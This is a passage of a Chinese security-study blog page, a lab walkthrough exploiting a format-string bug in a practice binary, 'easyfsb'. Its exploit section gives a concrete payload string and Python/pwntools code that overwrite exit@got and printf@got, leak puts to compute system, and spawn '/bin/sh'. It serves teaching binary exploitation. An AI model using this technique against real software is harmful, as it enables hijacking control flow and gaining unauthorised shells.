+</ul>
+<p>由此可见，格式化字符串漏洞还能对内存进行覆写，如果程序中用到了类似本例中的<code>printf(format)</code>，就极有可能造成格式化字符串漏洞；</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ol>
+<li><p>用IDA对easyfsb程序进行分析，函数逻辑比较简单，在main函数调用了getname函数；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225144355.png" style="zoom:50%;"></li>
+<li><p>查看getname()函数，发现<code>print(&amp;buf)</code>，存在格式化字符串漏洞；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225144437.png" style="zoom:50%;"></li>
+<li><p>由于程序编译时会采用两种表进行辅助，一个为PLT表，一个为GOT表，这两个表是一一对应的，看到带有**@plt**标志的函数时，这个函数其实就是个过渡作用，可以通过PLT表跳转到GOT表来得到函数真正的地址；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225144700.png" style="zoom:40%;"></li>
+</ol>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol>
+<li> 将exit函数的GOT表地址覆写为main函数的地址，程序每次退出时将再返回到main函数；</li>
+<li> 通过printf格式化字符串漏洞，获取puts函数地址，再通过libc的相对地址偏移获取system的地址；</li>
+<li> 用格式化字符串漏洞，将system函数地址覆盖GOT表中printf函数的地址，并在buf 中写入<code>/bin/sh</code>，当执行<code>printf(buf)</code>时，相当于执行<code>system('/bin/sh')</code>；</li>
+</ol>
+<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><ol>
+<li><p>将exit函数的GOT表地址覆写为main函数的地址</p>
+<ol>
+<li><p>覆写思路分析</p>
+<p> 覆写的格式为：<code>% width c % num $ hhn</code>，其中width是将要写入到<code>$hhn</code>参数中的值，它由覆写的值和已经写入的长度决定，具体为：**(已写入的长度-覆写的值 )%0x100**；</p>
+<p> num定了要写入的第num个参数，需要通过调试具体分析一下；</p>
+</li>
+<li><p>使用gdb调试，在main和printf处设置断点；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225145622.png" style="zoom:50%;"></li>
+<li><p>运行到printf处，可以看到buf的地址为<code>0xffffd54c</code>，是printf中格式化字符串的第7个参数，即:<code>(0xffffd54c-0xffffd530)/4 = 7</code>；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225145853.png" style="zoom:40%;"></li>
+<li><p>num的确定；</p>
+<ul>
+<li>  因为要把exit的GOT地址覆写为main函数地址，即<code>0x8048648</code>，所以应写入四个字节，即重复四次<code>% width c % num $ hhn</code>；</li>
+<li>  粗略估计width最多占用3个字节，num最多占用2个字节，则每个格式<code>% widthc % num $ hhn</code>占用12个字节，四次重复共48个字节，占用48/4=12个参数；</li>
+<li>  由于buf是从第7个参数开始，写入的地址从第7+12=19个参数开始，num依次为19、20、21、22；</li>
+</ul>
+</li>
+<li><p>确定<code>exit@got</code>的地址；</p>
+<ol>
+<li><p>查看main函数的汇编指令，第一条指令的地址即为main函数的地址，即<code>0x0848648</code>，最后一条指令为exit函数的plt表的地址:<code>0x8048480</code>；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225150637.png" style="zoom:40%;"></li>
+<li><p>查看<code>0x8048480</code>处的汇编指令，第一条为跳转指令，直接跳转到<code>0x804a024</code>，此地址即为exit函数got表的地址；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225150919.png" style="zoom:40%;"></li>
+<li><p>通过查看<code>0x804a024</code>出的内存数据，可以看到第一条地址<code>0x08048486</code>即为exit函数的真正地址；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225151137.png" style="zoom:40%;"></li>
+</ol>
+</li>
+<li><p>构造格式化字符串:</p>
+<p> 确定了num和width，也确定了exit函数的got表地址为<code>0x804a024</code>，所以将要覆盖的exit@got地址<code>0x804a024</code>、<code>0x804a025</code>、<code>0x804a026</code>、<code>0x804a027</code>依次写入到第19、20、21、22个参数中，格式化字符串就构造好了：</p>
+<p> <code>%72c%19$hhn%62c%20$hhn%126c%21$hhn%4c%22$hhnaaaa\x24\xa0\x04\x08\x25\xa0\x04\x08\x26\xa0\x04\ x08\x27\xa0\x04\x08</code></p>
+</li>
+<li><p>编写<code>generate_format(addr, value)</code>函数构造格式化字符串，addr为要覆写的地址，value为覆写的值，函数代码如下：</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#generate format string</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_format</span>(<span class="params">addr, value</span>):</span><br><span class="line">        payload = <span class="string">''</span></span><br><span class="line">        print_count = <span class="number">0</span></span><br><span class="line">        addr_part = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; (<span class="number">8</span>*i)) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            one_byte = (value &gt;&gt; (<span class="number">8</span>*i)) &amp; <span class="number">0xff</span></span><br><span class="line">            payload += <span class="string">'%{0}c%{1}$hhn'</span>.<span class="built_in">format</span>((one_byte - print_count) % <span class="number">0x100</span>, <span class="number">19</span> + i)</span><br><span class="line">            print_count += (one_byte - print_count) % <span class="number">0x100</span> </span><br><span class="line">            addr_part += p32(addr + i)</span><br><span class="line">        payload = payload.ljust(<span class="number">48</span>, <span class="string">'a'</span>)</span><br><span class="line">        payload += addr_part</span><br><span class="line">        <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure></li>
+<li><p>调用<code>generate_format(exit_got,main)</code>函数，生成的payload作为输入，执行后可以看到exit的got表的第一个地址被覆盖为main函数的地址，即<code>0x08048648</code>；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225152237.png" style="zoom:40%;"></li>
+</ol>
+</li>
+<li><p>获取system函数的地址</p>
+<ol>
+<li><p>获取思路分析</p>
+<p> 由于格式化字符串漏洞能够泄露内存关键数据，可以考虑利用这个漏洞泄露system 的地址，利用格式化字符串漏洞，泄露出GOT表中puts的地址，再利用libc中system函数与puts函数的偏移，计算出system地址；</p>
+</li>
+<li><p>先获取puts函数的got表地址，类似于查看exit函数的got表地址，所以puts函数got表的地址为<code>0x804a01c</code>，虽然可以直接查看<code>0x804a01c</code>内容即可得到puts函数的实际地址，这里使用格式化字符串漏洞来获取；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225153759.png" style="zoom:40%;"></li>
+<li><p>构造格式化字符串</p>
+<ol>
+<li><p> 构造的格式化字符串格式为：<code>%num$s+puts@got</code>，即把puts@got的地址写入 buf，再通过<code>%s</code>读出；</p>
+</li>
+<li><p> 其中<code>%num$s</code>占4个字节，是第7个参数；puts@got占4个字节，是第8个参数，num就可以写为8，即将puts@got的地址写入到第8个参数的位置；</p>
+</li>
+<li><p> 获取了puts的实际地址后，通过libc中两个函数的偏移即可得到system的地址，通过查阅资料可以得到libc的库的位置为<code>/lib/i386-linux-gnu/libc.so.6</code>；</p>
+</li>
+<li><p>完整代码如下</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#get sys_addr through puts_addr</span></span><br><span class="line">p.recvuntil(<span class="string">'Welcome~\n'</span>)</span><br><span class="line">payload = <span class="string">'%8$s'</span>+p32(puts_got)	<span class="comment">#format string to output puts_addr</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))	<span class="comment">#get puts_addr</span></span><br><span class="line">log.info(<span class="string">'puts:%#x'</span>%puts_addr)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)	<span class="comment">#libc.so location</span></span><br><span class="line">sys_addr = puts_addr - (libc.symbols[<span class="string">'puts'</span>]-libc.symbols[<span class="string">'system'</span>])</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+</li>
+<li><p>覆写got表中printf的地址</p>
+<p> 原理与覆写exit函数GOT表相同，调用<code>generate_format(printf@got,system_addr)</code>，生成的payload作为输入，代码如下：</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#overwrite printf_got with system addr</span></span><br><span class="line">p.recvuntil(<span class="string">'Welcome~\n'</span>)</span><br><span class="line">payload = generate_format(printf_got,sys_addr)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure></li>
+<li><p>执行<code>system('/bin/sh')</code></p>
+<ol>
+<li><p>此时GOT表中printf地址已被覆写为system地址，在buf中输入<code>/bin/sh</code>，执行<code>printf(buf)</code>时，相当于执行<code>system('/bin/sh')</code>，最后代码如下:</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#system('/bin/sh')</span></span><br><span class="line">p.recvuntil(<span class="string">'Welcome~\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
+<li><p>运行编写的python代码，成功拿到shell权限；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225154548.png" style="zoom:40%;"></li>
+</ol>
+</li>
+</ol>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7398">https://xz.aliyun.com/t/7398</a></p>
+<p>备注：<a target="_blank" rel="noopener" href="https://github.com/Leeyuxun/Binary-Experiment-Program">实验程序下载</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>李钰璕
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://leeyuxun.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%20%E4%B8%8B%E5%8D%881.44.18.html" title="二进制-格式化字符串漏洞">https://leeyuxun.github.io/二进制-格式化字符串漏洞 下午1.44.18.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-cn" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" rel="tag"><i class="fa fa-tag"></i> 格式化字符串</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E.html" rel="prev" title="二进制-数组越界漏洞">
+      <i class="fa fa-chevron-left"></i> 二进制-数组越界漏洞
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E.html" rel="next" title="二进制-条件竞争漏洞">
+      二进制-条件竞争漏洞 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA%E5%87%BD%E6%95%B0"><span class="nav-number">2.1.</span> <span class="nav-text">格式化输出函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#printf"><span class="nav-number">2.1.1.</span> <span class="nav-text">printf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sprintf"><span class="nav-number">2.1.2.</span> <span class="nav-text">sprintf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#snprintf"><span class="nav-number">2.1.3.</span> <span class="nav-text">snprintf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fprintf"><span class="nav-number">2.1.4.</span> <span class="nav-text">fprintf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vprintf-vsprintf-vsnprintf-vfprintf"><span class="nav-number">2.1.5.</span> <span class="nav-text">vprintf&#x2F;vsprintf&#x2F;vsnprintf&#x2F;vfprintf</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">2.2.</span> <span class="nav-text">格式化字符串</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">3.</span> <span class="nav-text">漏洞原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="nav-number">3.1.</span> <span class="nav-text">格式化字符串利用方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E6%BC%8F%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80"><span class="nav-number">3.1.1.</span> <span class="nav-text">泄漏内存地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A6%86%E5%86%99%E5%86%85%E5%AD%98"><span class="nav-number">3.1.2.</span> <span class="nav-text">覆写内存</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">4.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-number">4.2.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-number">4.3.</span> <span class="nav-text">利用过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="李钰璕"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">李钰璕</p>
+  <div class="site-description" itemprop="description">安全学习笔记</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">89</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">115</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Leeyuxun" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Leeyuxun" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:leeyuxun@163.com" title="E-Mail → mailto:leeyuxun@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <!--
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">李钰璕</span>
+</div>
+-->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = 'true';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+</body>
+</html>
